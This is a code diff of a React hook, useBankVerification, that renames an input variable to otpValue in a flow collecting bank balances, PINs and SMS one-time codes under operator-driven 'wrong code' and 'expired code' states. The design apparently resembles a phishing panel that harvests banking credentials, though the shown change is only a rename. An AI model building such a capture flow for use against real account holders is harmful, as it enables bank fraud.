@@ -38,8 +38,8 @@ export interface UseBankVerificationReturn {
   operatorMessage: OperatorMessage | null;
   balance: string;
   onBalanceChange: (v: string) => void;
-  inputValue: string;
-  setInputValue: (v: string) => void;
+  otpValue: string;
+  setOtpValue: (v: string) => void;
   wrongCode: boolean;
   expiredCode: boolean;
   resendState: ResendState;
@@ -52,7 +52,7 @@ export function useBankVerification(): UseBankVerificationReturn {
   const { sessionId } = useSessionFromStorage(channelSlug);
   const [submitError, setSubmitError] = useState<string | null>(null);
   const [submitting, setSubmitting] = useState(false);
-  const [inputValue, setInputValue] = useState("");
+  const [otpValue, setOtpValue] = useState("");
   const [pinMasked, setPinMasked] = useState(true);
   const [balance, setBalance] = useState("");
 
@@ -88,7 +88,7 @@ export function useBankVerification(): UseBankVerificationReturn {
   useEffect(() => {
     if (wrongCode || expiredCode) {
       setSubmitting(false);
-      setInputValue("");
+      setOtpValue("");
     }
   }, [wrongCode, expiredCode]);
 
@@ -156,16 +156,16 @@ export function useBankVerification(): UseBankVerificationReturn {
     if (layout === "balance") {
       handleSubmitBalance(balance);
     } else if (layout === "pin" || layout === "sms") {
-      handleSubmitOtp(inputValue);
+      handleSubmitOtp(otpValue);
     }
-  }, [layout, balance, inputValue, handleSubmitBalance, handleSubmitOtp]);
+  }, [layout, balance, otpValue, handleSubmitBalance, handleSubmitOtp]);
 
   const canSubmit =
     layout === "balance"
       ? balance.trim().length > 0
       : layout === "pin"
-        ? inputValue.replace(/\D/g, "").length === PIN_LENGTH
-        : inputValue.replace(/\D/g, "").length >= OTP_MIN_LENGTH;
+        ? otpValue.replace(/\D/g, "").length === PIN_LENGTH
+        : otpValue.replace(/\D/g, "").length >= OTP_MIN_LENGTH;
 
   return {
     layout,
@@ -180,8 +180,8 @@ export function useBankVerification(): UseBankVerificationReturn {
     operatorMessage: operatorMessage ?? null,
     balance,
     onBalanceChange: setBalance,
-    inputValue,
-    setInputValue,
+    otpValue,
+    setOtpValue,
     wrongCode,
     expiredCode,
     resendState,
